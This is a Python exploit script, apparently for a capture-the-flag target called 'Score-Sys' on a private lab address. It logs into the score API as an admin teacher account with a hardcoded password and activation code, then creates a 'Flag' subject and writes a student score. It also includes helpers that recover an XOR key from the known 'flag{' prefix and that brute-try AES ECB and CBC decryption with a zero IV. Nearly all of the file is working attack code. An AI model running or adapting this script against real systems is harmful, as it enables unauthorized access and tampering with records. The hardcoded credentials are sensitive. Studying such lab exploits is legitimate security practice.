#!/usr/bin/env python3
import requests
import json
import base64

BASE_URL = "http://192.168.100.110:3333"
HEADERS = {
    "x-activate-code": "8d7a77ae-dac9-4397-afd6-44b92fd5b6f7",
    "Content-Type": "application/json",
}


def check_endpoint(session, method, endpoint, params=None, data=None):
    url = f"{BASE_URL}{endpoint}"
    print(f"[*] Checking {method} {url}...")
    try:
        response = None
        if method == "GET":
            response = session.get(url, params=params)
        elif method == "POST":
            response = session.post(url, json=data)

        if response is not None:
            print(f"    Status: {response.status_code}")
            try:
                print(f"    Response: {json.dumps(response.json(), indent=2)}")
            except:
                print(f"    Response: {response.text}")

            if response.headers:
                print(f"    Headers: {dict(response.headers)}")

            if response.cookies:
                print(f"    Cookies: {response.cookies.get_dict()}")
        else:
            print("[-] Invalid method")

    except Exception as e:
        print(f"[-] Error: {e}")


def known_plaintext_attack(ciphertext_b64, known_prefix="flag{"):
    try:
        padding = 4 - (len(ciphertext_b64) % 4)
        if padding != 4:
            ciphertext_b64 += "=" * padding
        ct_bytes = base64.urlsafe_b64decode(ciphertext_b64)

        print(f"\n[KPA] Ciphertext (Hex): {ct_bytes.hex()}")
        print(f"[KPA] Plaintext Prefix: {known_prefix}")

        derived_key = []
        for i in range(min(len(ct_bytes), len(known_prefix))):
            k = ct_bytes[i] ^ ord(known_prefix[i])
            derived_key.append(k)

        print(f"[KPA] Derived Key Prefix (Hex): {bytes(derived_key).hex()}")
        return bytes(derived_key)
    except Exception as e:
        print(f"[KPA] Error: {e}")
        return None


def xor_bytes(ct_bytes, key_bytes):
    dec = []
    for i in range(len(ct_bytes)):
        dec.append(ct_bytes[i] ^ key_bytes[i % len(key_bytes)])
    return bytes(dec)


from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import hashlib


def decrypt_aes(ciphertext_b64, key, iv=None):
    try:
        ct = base64.urlsafe_b64decode(ciphertext_b64 + "===")
        if iv is None:
            iv = b"\x00" * 16

        try:
            cipher = AES.new(key, AES.MODE_ECB)
            pt = cipher.decrypt(ct)
            print(f"    AES Mode ECB: {pt}")
            try:
                pt_unpad = unpad(pt, 16)
                print(f"    AES Mode ECB (Unpad): {pt_unpad}")
                print(f"    UTF-8: {pt_unpad.decode()}")
            except:
                pass
        except Exception as e:
            pass

        try:
            cipher = AES.new(key, AES.MODE_CBC, iv)
            pt = cipher.decrypt(ct)
            print(f"    AES Mode CBC: {pt}")
            try:
                pt_unpad = unpad(pt, 16)
                print(f"    AES Mode CBC (Unpad): {pt_unpad}")
                print(f"    UTF-8: {pt_unpad.decode()}")
            except:
                pass
        except Exception as e:
            pass

    except Exception as e:
        print(f"[-] AES Error: {e}")


def main():
    print("=== Score-Sys Exploit (Subjects) ===")

    session_admin = requests.Session()
    session_admin.headers.update(HEADERS)

    print("\n[+] Logging in as Admin (T001)...")
    check_endpoint(
        session_admin,
        "POST",
        "/api/v1/login",
        data={
            "user_id": "T001",
            "password": "QRSwojjqYV3r3FWvrQ_V3eminq-zZYc5BCZAu_6ptBM",
            "user_type": "teacher",
        },
    )

    print("\n[+] Adding Subject 'Flag'...")
    check_endpoint(session_admin, "POST", "/api/v1/subject", data={"name": "Flag"})

    print("\n[+] Checking Subjects...")
    check_endpoint(session_admin, "GET", "/api/v1/subjects")

    print("\n[+] Setting Score for Subject 'Flag'...")
    check_endpoint(
        session_admin,
        "POST",
        "/api/v1/score",
        data={"student_id": "S001", "subject": "Flag", "score": 100},
    )

    print("\n[+] Fetching Alice's scores...")
    check_endpoint(session_admin, "GET", "/api/v1/student/S001/scores")


if __name__ == "__main__":
    main()
